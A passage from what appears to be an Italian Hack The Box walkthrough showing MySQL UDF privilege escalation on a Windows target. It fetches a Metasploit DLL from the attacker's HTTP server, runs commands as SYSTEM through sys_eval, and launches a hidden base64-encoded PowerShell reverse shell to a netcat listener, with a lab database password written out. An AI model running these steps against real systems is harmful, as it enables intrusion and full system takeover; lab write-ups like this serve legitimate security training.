**Risultato osservato:**

```
/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.dll
/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll
```

Windows 11 sul target è a **64 bit**, quindi scegliamo `lib_mysqludf_sys_64.dll`.
### 10.3 Avvio di un secondo server HTTP su Parrot

Su Parrot.

```
python3 -m http.server 8001 --directory /usr/share/metasploit-framework/data/exploits/mysql
```

- `8001`: porta TCP del nuovo server HTTP.
- `--directory ...`: espone direttamente la directory che contiene le DLL trovate.

Ora la DLL può essere richiesta a:

```
http://10.10.15.73:8001/lib_mysqludf_sys_64.dll
```

### 10.4 Download della DLL nella directory plugin

Sulla macchina traget PowerShell di `KioskUser`.

```
Invoke-WebRequest -Uri 'http://10.10.15.73:8001/lib_mysqludf_sys_64.dll' -OutFile 'C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll'
```

`Invoke-WebRequest` scarica il file; `-OutFile` specifica il percorso di destinazione.

**Perché il download riesce?** `icacls` aveva confermato che `Authenticated Users` possiede `Modify` sulla directory dei plugin.

**Verifica del trasferimento:**

```
Get-Item 'C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll' | Select-Object Name,Length
```

Il comando legge il file e ne mostra nome e dimensione. Nella sessione il trasferimento è riuscito.
### 10.5 Registrazione della funzione e prova di esecuzione

Lanciamo questo comando; per chiamare MySQL usiamo l'account SQL `root`.

```
& 'C:\MySQL\bin\mysql.exe' -h 127.0.0.1 -u root '-pHTB@irw4ys_DB!2026' -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll'; SELECT sys_eval('whoami');"
```

All'interno delle virgolette vengono eseguite **due istruzioni SQL**:

**Prima istruzione:**

```
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';
```

- `CREATE FUNCTION`: registra una UDF MySQL.
- `sys_eval`: nome SQL della funzione da rendere disponibile.
- `RETURNS STRING`: indica che restituisce una stringa.
- `SONAME '...'`: identifica la DLL da caricare dalla directory `plugin_dir`.

**Seconda istruzione:**

```
SELECT sys_eval('whoami');
```

- `SELECT`: richiama la funzione e mostra il valore restituito.
- `'whoami'`: semplice comando Windows che visualizza l'identità dell'utente che lo esegue.

**Risultato effettivo:**

```
sys_eval('whoami')
nt authority\system
```

**Interpretazione precisa:** MySQL ha caricato la DLL e la funzione ha eseguito `whoami` con il token del servizio MySQL: **`NT AUTHORITY\SYSTEM`**.

La reverse shell iniziale non cambia identità: rimane `KioskUser`. Ora, però, ogni comando eseguito da `sys_eval()` gira nel contesto SYSTEM.
## 11. Da esecuzione SYSTEM tramite SQL a una reverse shell SYSTEM

### 11.1 Differenza tra le due situazioni

Prima del prossimo passo abbiamo:

- **Shell 1**, porta `4444`: PowerShell come `KioskUser`.
- **Esecuzione di singoli comandi SYSTEM**: disponibile passando per `SELECT sys_eval(...)`.

Vogliamo invece **Shell 2**, porta `5555`: una connessione PowerShell il cui processo sia stato avviato direttamente come SYSTEM.
### 11.2 Preparazione di `rev_system.ps1`

Lanciamo questo comando:

```
$src=Join-Path $env:TEMP 'rev.ps1'; $dst=Join-Path $env:TEMP 'rev_system.ps1'; (Get-Content $src -Raw).Replace('4444','5555') | Set-Content $dst; Write-Output $dst
```

Il comando è una singola riga PowerShell composta da più istruzioni:

1. $src: individua lo script originale nella cartella temporanea.
2. $dst: definisce il nuovo file `rev_system.ps1`.
3. `Get-Content -Raw`: legge l'intero script come una sola stringa.
4. `.Replace('4444','5555')`: cambia la porta di connessione.
5. `Set-Content`: salva il nuovo script.
6. `Write-Output $dst`: mostra dove è stato salvato.
### 11.3 Apertura del nuovo listener

Su un nuovo terminale Parrot.

```
nc -lvnp 5555
```

Manteniamo aperto anche il listener sulla porta `4444`: ci servirà per inviare il comando MySQL che avvia la seconda shell.
### 11.4 Avvio di PowerShell come SYSTEM tramite `sys_eval`

Sulla shell `KioskUser`:

```
$script=Join-Path $env:TEMP 'rev_system.ps1'; $cmd="Start-Process powershell.exe -ArgumentList '-NoP -ExecutionPolicy Bypass -File $script' -WindowStyle Hidden"; $b64=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd)); & 'C:\MySQL\bin\mysql.exe' -h 127.0.0.1 -u root '-pHTB@irw4ys_DB!2026' -N -B -e "SELECT sys_eval('powershell.exe -NoP -EncodedCommand $b64');"
```

La logica, scomposta, è questa.

**A. Indicare lo script da eseguire:**

```
$script=Join-Path $env:TEMP 'rev_system.ps1'
```

**B. Preparare il comando che avvia un nuovo processo:**

```
$cmd="Start-Process powershell.exe -ArgumentList '-NoP -ExecutionPolicy Bypass -File $script' -WindowStyle Hidden"
```

`Start-Process` crea un nuovo processo PowerShell invece di mantenere bloccata la chiamata MySQL per tutta la durata della connessione.

**C. Codificare il comando per il passaggio a PowerShell:**

```
$b64=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
```

PowerShell `-EncodedCommand` si aspetta una stringa in Base64 che rappresenti caratteri Unicode **UTF-16LE**. La codifica serve a trasportare il comando con virgolette e spazi senza complicare l'escaping: **non crea privilegi**.

**D. Chiedere a MySQL di lanciare PowerShell:**

```
SELECT sys_eval('powershell.exe -NoP -EncodedCommand ...');
```

Qui la parola chiave è **`sys_eval`**: il processo MySQL, eseguito come `LocalSystem`, avvia il processo figlio. Perciò il nuovo PowerShell parte come SYSTEM e a sua volta esegue `rev_system.ps1`.

Lo script si connette a Parrot sulla porta `5555`.
### 11.5 Verifica sulla nuova shell

Sul listener Netcat `5555`.

```
whoami
```

**Output osservato:**

```
nt authority\system
```

**Privilege escalation completata anche come sessione remota:** ora disponiamo di una reverse shell PowerShell in esecuzione direttamente come SYSTEM.

Nella cartella **C:\Users\Administrator\Desktop** troviamo la root flag.
